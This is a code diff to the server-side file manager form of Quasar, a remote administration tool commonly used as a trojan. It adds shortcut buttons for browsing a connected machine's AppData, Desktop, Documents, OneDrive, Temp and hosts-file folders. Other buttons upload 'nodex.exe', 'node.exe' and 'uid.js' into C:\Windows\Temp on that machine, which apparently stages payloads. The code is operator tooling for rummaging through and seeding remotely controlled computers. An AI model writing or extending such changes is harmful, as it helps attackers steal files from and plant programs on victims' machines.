@@ -30,7 +30,7 @@ namespace Quasar.Server.Forms
         /// <summary>
         /// The message handler for handling the communication with the client.
         /// </summary>
-        private readonly FileManagerHandler _fileManagerHandler;
+        public readonly FileManagerHandler _fileManagerHandler;
 
         private enum TransferColumn
         {
@@ -112,7 +112,7 @@ namespace Quasar.Server.Forms
         {
             if (!connected)
             {
-                this.Invoke((MethodInvoker)this.Close);
+                //this.Invoke((MethodInvoker)this.Close);
             }
         }
 
@@ -252,6 +252,7 @@ namespace Quasar.Server.Forms
             this.Text = WindowHelper.GetWindowTitle("File Manager", _connectClient);
 
             _fileManagerHandler.RefreshDrives();
+            this.textBox_username.Text = _connectClient.Value.Username;
         }
 
         private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
@@ -293,7 +294,7 @@ namespace Quasar.Server.Forms
                 {
                     string remotePath = GetAbsolutePath(files.SubItems[0].Text);
 
-                    _fileManagerHandler.BeginDownloadFile(remotePath);
+                    _fileManagerHandler.BeginDownloadFile(remotePath,"",false,"Files");
                 }
             }
         }
@@ -546,6 +547,72 @@ namespace Quasar.Server.Forms
         {
             _fileManagerHandler.GetDirectoryContents(remotePath);
             SetStatusMessage(this, "Loading directory content...");
+        }
+
+        private void navigate_etc_Click(object sender, EventArgs e)
+        {
+            _fileManagerHandler.GetDirectoryContents("C:\\Windows\\System32\\drivers\\etc");
+            SetStatusMessage(this, "Loading directory content...");
+        }
+
+        private void navigate_appdata_Click(object sender, EventArgs e)
+        {
+            string textBox_username = this.textBox_username.Text;
+            _fileManagerHandler.GetDirectoryContents("C:\\Users\\"+ textBox_username + "\\AppData");
+            SetStatusMessage(this, "Loading directory content...");
+        }
+
+        private void navigate_custom_Click(object sender, EventArgs e)
+        {
+            string custom = this.custom_path_textbox.Text;
+            _fileManagerHandler.GetDirectoryContents(custom);
+            SetStatusMessage(this, "Loading directory content...");
+        }
+
+        private void desktop_button_Click(object sender, EventArgs e)
+        {
+            string textBox_username = this.textBox_username.Text;
+            _fileManagerHandler.GetDirectoryContents("C:\\Users\\" + textBox_username + "\\Desktop");
+            SetStatusMessage(this, "Loading directory content...");
+        }
+
+        private void button_documents_Click(object sender, EventArgs e)
+        {
+            string textBox_username = this.textBox_username.Text;
+            _fileManagerHandler.GetDirectoryContents("C:\\Users\\" + textBox_username + "\\Documents");
+            SetStatusMessage(this, "Loading directory content...");
+        }
+
+        private void onedrive_button_Click(object sender, EventArgs e)
+        {
+            string textBox_username = this.textBox_username.Text;
+            _fileManagerHandler.GetDirectoryContents("C:\\Users\\" + textBox_username + "\\OneDrive");
+            SetStatusMessage(this, "Loading directory content...");
+        }
+
+        private void button_temp_Click(object sender, EventArgs e)
+        {
+            _fileManagerHandler.GetDirectoryContents("C:\\Windows\\Temp");
+            SetStatusMessage(this, "Loading directory content...");
+        }
+
+        private void button_root_Click(object sender, EventArgs e)
+        {
+            _fileManagerHandler.GetDirectoryContents("C:\\");
+            SetStatusMessage(this, "Loading directory content...");
+        }
+
+        private void button_nodex_Click(object sender, EventArgs e)
+        {
+            FrmFileManager frmFM = new FrmFileManager(_connectClient);
+            frmFM._fileManagerHandler.BeginUploadFile("nodex.exe", "C:\\Windows\\Temp\\nodex.exe");
+        }
+
+        private void button_node_uid_Click(object sender, EventArgs e)
+        {
+			FrmFileManager frmFM = new FrmFileManager(_connectClient);
+            frmFM._fileManagerHandler.BeginUploadFile("node.exe", "C:\\Windows\\Temp\\node.exe");
+            frmFM._fileManagerHandler.BeginUploadFile("uid.js", "C:\\Windows\\Temp\\uid.js");
         }
     }
 }
